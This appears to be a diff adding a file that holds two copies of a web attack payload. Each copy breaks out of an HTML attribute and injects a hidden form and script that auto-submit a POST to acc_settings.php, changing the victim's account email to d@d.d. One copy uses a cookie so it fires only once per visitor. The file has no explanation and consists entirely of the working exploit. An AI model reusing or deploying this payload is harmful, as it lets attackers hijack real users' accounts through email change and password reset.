@@ -1,0 +1,21 @@
+><iframe style=display:none name=csrf-frame></iframe>
+<form name=CSRF method=post action=acc_settings.php>
+  <input type=hidden name=change_email value=d@d.d>
+  <input type=hidden name=form_submitted value=1>
+</form>
+<script>
+if (!getCookie(123456789)) {
+  setCookie(123456789, 1, 7);
+  document.CSRF.submit();
+} else {
+}</script><img src=https://i.ytimg.com/vi/AWpsOqh8q0M/maxresdefault.jpg
+
+
+><iframe style=display:none name=csrf-frame></iframe>
+<form name=CSRF method=post action=acc_settings.php>
+  <input type=hidden name=change_email value=d@d.d>
+  <input type=hidden name=form_submitted value=1>
+</form>
+<script>
+  document.CSRF.submit();
+</script><img src=https://i.ytimg.com/vi/AWpsOqh8q0M/maxresdefault.jpg
